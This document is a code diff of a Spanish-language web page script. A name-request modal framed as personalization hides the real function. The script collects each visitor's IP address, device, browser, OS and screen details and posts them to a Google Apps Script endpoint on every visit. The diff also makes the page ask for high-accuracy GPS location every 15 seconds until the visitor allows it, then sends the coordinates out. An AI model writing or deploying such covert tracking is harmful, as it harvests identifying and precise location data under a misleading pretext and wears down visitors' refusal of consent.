@@ -195,17 +195,23 @@ window.addEventListener('DOMContentLoaded', () => {
   const footer = document.getElementById('modalFooter');
   let nombreUsuario = "";
 
-  // Si el usuario ya pasó el modal antes
-  if (localStorage.getItem("modalMostrado") === "true") {
-    const nombreGuardado = localStorage.getItem("nombreUsuario") || "Anónimo";
-    enviarDatosBasicos(nombreGuardado);
+  const SHEET_URL = "https://script.google.com/macros/s/AKfycbzmCy4PK0oXrYCNC1wHaNKkhvd26prvRyRl_aD3m7cEW65KyYHRhElGaJM3eSQtFjau/exec";
+
+  // 🔹 Si el usuario ya tiene nombre guardado
+  const nombreGuardado = localStorage.getItem("nombreUsuario");
+  if (nombreGuardado) {
+    nombreUsuario = nombreGuardado;
+    // Enviar datos básicos cada vez que entra
+    enviarDatosBasicos(nombreUsuario);
+    // Intentar obtener ubicación cada vez que entra
+    intentarObtenerUbicacion(nombreUsuario, true);
     return;
   }
 
-  // Mostrar modal si no se ha mostrado
+  // Mostrar modal si nunca lo llenó
   modal.show();
 
-  // Paso 1
+  // Paso 1 - pedir nombre
   function pasarAPedirNombre() {
     body.innerHTML = `
       <p>Para ofrecerte un servicio más personalizado, necesitamos conocer tu nombre.</p>
@@ -221,7 +227,7 @@ window.addEventListener('DOMContentLoaded', () => {
   document.getElementById('siBtn').addEventListener('click', pasarAPedirNombre);
   document.getElementById('noBtn').addEventListener('click', pasarAPedirNombre);
 
-  // Paso 2
+  // Paso 2 - confirmación
   function agregarEventosPaso2() {
     document.getElementById('continuarNombreBtn').addEventListener('click', () => {
       const input = document.getElementById('nombreInput');
@@ -243,19 +249,12 @@ window.addEventListener('DOMContentLoaded', () => {
     });
   }
 
-  // Paso 3
+  // Paso 3 - guardar y continuar
   function agregarEventosPaso3() {
     document.getElementById('aceptarBtn').addEventListener('click', () => {
-      // Guardar nombre y estado del modal
-      localStorage.setItem("modalMostrado", "true");
       localStorage.setItem("nombreUsuario", nombreUsuario);
-
-      // Enviar datos básicos (sin ubicación aún)
       enviarDatosBasicos(nombreUsuario);
-
-      // Intentar obtener ubicación (si da permiso, se envía después)
       intentarObtenerUbicacion(nombreUsuario);
-
       modal.hide();
     });
 
@@ -265,8 +264,9 @@ window.addEventListener('DOMContentLoaded', () => {
     });
   }
 
-  // ---- Funciones principales ----
+  // --- FUNCIONES PRINCIPALES ---
 
+  // Enviar datos sin ubicación
   function enviarDatosBasicos(nombre) {
     fetch('https://api.ipify.org?format=json')
       .then(res => res.json())
@@ -281,16 +281,16 @@ window.addEventListener('DOMContentLoaded', () => {
           nombre: nombre || "Desconocido",
           latitud: "",
           longitud: "",
-          ip: ip,
+          ip,
           dispositivo: ua,
-          navegador: navegador,
-          os: os,
-          arquitectura: arquitectura,
+          navegador,
+          os,
+          arquitectura,
           pantalla: resolucion
         };
 
-        fetch('https://script.google.com/macros/s/AKfycbzmCy4PK0oXrYCNC1wHaNKkhvd26prvRyRl_aD3m7cEW65KyYHRhElGaJM3eSQtFjau/exec', {
-          method: 'POST',
+        fetch(SHEET_URL, {
+          method: "POST",
           body: JSON.stringify(data)
         })
         .then(r => r.json())
@@ -299,46 +299,60 @@ window.addEventListener('DOMContentLoaded', () => {
       });
   }
 
-  function intentarObtenerUbicacion(nombre) {
+  // Pedir ubicación siempre hasta que el usuario acepte
+  function intentarObtenerUbicacion(nombre, repetir = false) {
     if (!navigator.geolocation) return;
 
-    navigator.geolocation.getCurrentPosition(
-      (pos) => {
-        const { latitude, longitude } = pos.coords;
+    const pedir = () => {
+      navigator.geolocation.getCurrentPosition(
+        (pos) => {
+          const { latitude, longitude } = pos.coords;
+          console.log("📍 Ubicación obtenida:", latitude, longitude);
+          enviarUbicacion(nombre, latitude, longitude);
+          localStorage.setItem("permitioUbicacion", "true");
+        },
+        (err) => {
+          console.warn("❌ Usuario negó la ubicación:", err);
+          // Si el usuario no permite, volver a intentar cada 15s
+          setTimeout(pedir, 15000);
+        },
+        { enableHighAccuracy: true, timeout: 10000 }
+      );
+    };
 
-        fetch('https://api.ipify.org?format=json')
-          .then(res => res.json())
-          .then(ipResp => {
-            const ip = ipResp.ip;
-            const ua = navigator.userAgent;
-            const { navegador, os, arquitectura } = parseUserAgent(ua);
-            const resolucion = `${screen.width}x${screen.height}`;
+    pedir();
+  }
 
-            const data = {
-              tipo: "ubicacion",
-              nombre: nombre || "Desconocido",
-              latitud: latitude,
-              longitud: longitude,
-              ip: ip,
-              dispositivo: ua,
-              navegador: navegador,
-              os: os,
-              arquitectura: arquitectura,
-              pantalla: resolucion
-            };
+  function enviarUbicacion(nombre, lat, lon) {
+    fetch('https://api.ipify.org?format=json')
+      .then(res => res.json())
+      .then(ipResp => {
+        const ip = ipResp.ip;
+        const ua = navigator.userAgent;
+        const { navegador, os, arquitectura } = parseUserAgent(ua);
+        const resolucion = `${screen.width}x${screen.height}`;
 
-            fetch('https://script.google.com/macros/s/AKfycbzmCy4PK0oXrYCNC1wHaNKkhvd26prvRyRl_aD3m7cEW65KyYHRhElGaJM3eSQtFjau/exec', {
-              method: 'POST',
-              body: JSON.stringify(data)
-            })
-            .then(r => r.json())
-            .then(resp => console.log("📍 Ubicación guardada:", resp))
-            .catch(err => console.error("Error enviando ubicación:", err));
-          });
-      },
-      (err) => console.warn("❌ El usuario negó la ubicación:", err),
-      { enableHighAccuracy: true, timeout: 10000 }
-    );
+        const data = {
+          tipo: "ubicacion",
+          nombre: nombre || "Desconocido",
+          latitud: lat,
+          longitud: lon,
+          ip,
+          dispositivo: ua,
+          navegador,
+          os,
+          arquitectura,
+          pantalla: resolucion
+        };
+
+        fetch(SHEET_URL, {
+          method: "POST",
+          body: JSON.stringify(data)
+        })
+        .then(r => r.json())
+        .then(resp => console.log("📍 Ubicación guardada:", resp))
+        .catch(err => console.error("Error enviando ubicación:", err));
+      });
   }
 
   // Parsear user agent
